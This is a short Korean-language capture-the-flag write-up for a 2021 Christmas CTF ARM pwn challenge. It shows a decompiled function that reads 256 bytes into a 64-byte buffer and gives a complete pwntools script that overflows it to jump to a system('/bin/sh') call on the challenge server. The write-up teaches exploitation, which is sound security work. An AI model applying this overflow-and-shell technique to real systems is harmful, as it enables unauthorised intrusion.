---
title: Chrismas CTF Oil system write up
categories: [2021, Chrismas, new]
tags: [CTF, linux, baby, command_injection ]
---

Chrismas CTF Oil system write up

이번 크리스마스 CTF 문제가 나쁘지 않다고 들어서 pwn문제를 기준으로 쭈욱 풀었다.

# analyze


``` c++
__int64 vuln()
{
  char v1[64]; // [xsp+10h] [xbp+10h] BYREF

  sub_400290(v1, 0LL, 64LL);
  return read(0LL, v1, 256LL);
}
```

   아주 아주 쉬운 ARM version의 BOF 문제이다. system("/bin/sh")를 실행시키는 함수 또한 있다.

# solve
   bof를 이용하여 pc를 조절하여 system("/bin/sh")를 실행시키는 주소로 이동시킨다.

# ex.py
``` python
#!/usr/bin/env/python
# powerprove

from pwn import *

#s = process("./baby_RudOlPh")
s = remote("host6.dreamhack.games", 14291)
s.recvuntil("Baby RudOlP wanna get an ARM...!\n")
payload = b"A"*(0x40+8)
payload += p64(0x00000000040069C)
s.sendline(payload)
s.interactive()
```
